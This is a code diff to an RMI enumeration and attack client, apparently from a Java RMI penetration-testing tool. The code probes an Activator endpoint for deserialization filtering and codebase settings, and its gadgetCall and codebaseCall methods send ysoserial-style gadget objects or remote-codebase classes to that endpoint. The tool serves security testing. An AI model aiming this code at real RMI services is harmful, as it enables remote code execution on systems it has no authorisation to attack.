@@ -6,7 +6,6 @@ import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.MaliciousOutputStream;
 import de.qtc.rmg.networking.RMIWhisperer;
-import de.qtc.rmg.utils.DefinitelyNonExistingClass;
 
 public class ActivationClient {
 
@@ -27,22 +26,30 @@ public class ActivationClient {
         Logger.increaseIndent();
 
         try {
-            activateCall(new Object[] {"", false}, false);
+            activateCall(new Object[] {new java.util.HashMap<String,String>(), false}, false);
 
         } catch( Exception e ) {
 
-            if( e instanceof java.rmi.NoSuchObjectException ) {
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if( t instanceof java.rmi.NoSuchObjectException ) {
                 Logger.printMixedYellow("- Caught", "NoSuchObjectException", "during activate call ");
                 Logger.printlnPlainYellow("(activator not present).");
                 Logger.statusDefault();
 
-            } else if( e instanceof java.lang.IllegalArgumentException ) {
+            } else if( t instanceof java.lang.IllegalArgumentException ) {
                 Logger.printMixedYellow("- Caught", "IllegalArgumentException", "during activate call ");
                 Logger.printlnPlainYellow("(activator is present).");
                 Logger.printMixedBlue("  --> Deserialization", "allowed");
                 Logger.printlnPlainMixedRed("\t - Vulnerability Status:", "Vulnerable");
                 this.enumCodebase();
 
+            } else if( t instanceof java.io.InvalidClassException ) {
+                Logger.printMixedYellow("- Caught", "InvalidClassException", "during activate call ");
+                Logger.printlnPlainYellow("(activator is present).");
+                Logger.printMixedBlue("  --> Deserialization", "filtered");
+                Logger.printlnPlainMixedPurple("\t - Vulnerability Status:", "Undecided");
+                this.enumCodebase();
 
             } else {
                 ExceptionHandler.unexpectedException(e, "ActivationSystem", "enumeration", false);
@@ -58,25 +65,13 @@ public class ActivationClient {
     {
         try {
             MaliciousOutputStream.setDefaultLocation("InvalidURL");
-            activateCall(new Object[] {new DefinitelyNonExistingClass(), false}, true);
+            activateCall(new Object[] {0, false}, true);
 
         } catch( java.rmi.ServerException e ) {
 
             Throwable t = ExceptionHandler.getCause(e);
-            Throwable c = ExceptionHandler.getThrowable("ClassNotFoundException", e);
 
-            if( c != null ) {
-
-                if( c.getMessage().equals("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
-                    Logger.printMixedBlue("  --> Client codebase", "disabled");
-                    Logger.printlnPlainMixedGreen("\t - Configuration Status:", "Current Default");
-                    ExceptionHandler.showStackTrace(e);
-
-                } else {
-                    ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);
-                }
-
-            } else if( t instanceof java.net.MalformedURLException) {
+            if( t instanceof java.net.MalformedURLException) {
                 Logger.printMixedBlue("  --> Client codebase", "enabled");
                 Logger.printlnPlainMixedRed("\t - Configuration Status:", "Non Default");
                 ExceptionHandler.showStackTrace(e);
@@ -84,6 +79,11 @@ public class ActivationClient {
             } else {
                 ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);
             }
+
+        } catch( java.lang.IllegalArgumentException e ) {
+            Logger.printMixedBlue("  --> Client codebase", "disabled");
+            Logger.printlnPlainMixedGreen("\t - Configuration Status:", "Current Default");
+            ExceptionHandler.showStackTrace(e);
 
         } catch( Exception e ) {
             ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);
@@ -96,11 +96,9 @@ public class ActivationClient {
 
     public void gadgetCall(Object payloadObject)
     {
-        try {
-            Logger.printlnBlue("Attempting ysoserial attack on Activator endpoint...");
-            Logger.println("");
-            Logger.increaseIndent();
+        Logger.printGadgetCallIntro("Activation");
 
+        try {
             activateCall(new Object[] {payloadObject, false}, false);
 
         } catch( java.rmi.ServerException e ) {
@@ -125,6 +123,49 @@ public class ActivationClient {
 
         } catch( java.lang.IllegalArgumentException e ) {
             ExceptionHandler.illegalArgument(e);
+
+        } catch( Exception e ) {
+            ExceptionHandler.unexpectedException(e, "activate", "call", false);
+        }
+    }
+
+    public void codebaseCall(Object payloadObject)
+    {
+        String className = payloadObject.getClass().getName();
+        Logger.printCodebaseAttackIntro("Activator", "activate", className);
+
+        try {
+            activateCall(new Object[] {payloadObject, false}, false);
+
+        } catch( java.rmi.ServerException e ) {
+
+            Throwable cause = ExceptionHandler.getCause(e);
+
+            if( cause instanceof java.io.InvalidClassException ) {
+                ExceptionHandler.invalidClass(e, "Activator", className);
+                ExceptionHandler.showStackTrace(e);
+
+            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
+                ExceptionHandler.unsupportedClassVersion(e, "activate", "call");
+
+            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
+                ExceptionHandler.codebaseSecurityManager(e);
+
+            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
+                ExceptionHandler.codebaseClassNotFound(e, className);
+
+            } else if( cause instanceof java.lang.ClassCastException) {
+                ExceptionHandler.codebaseClassCast(e, false);
+
+            } else if( cause instanceof java.security.AccessControlException) {
+                ExceptionHandler.accessControl(e, "activate", "call");
+
+            } else {
+                ExceptionHandler.unexpectedException(e, "activate", "call", false);
+            }
+
+        } catch( java.lang.ClassCastException e ) {
+            ExceptionHandler.codebaseClassCast(e, false);
 
         } catch( Exception e ) {
             ExceptionHandler.unexpectedException(e, "activate", "call", false);
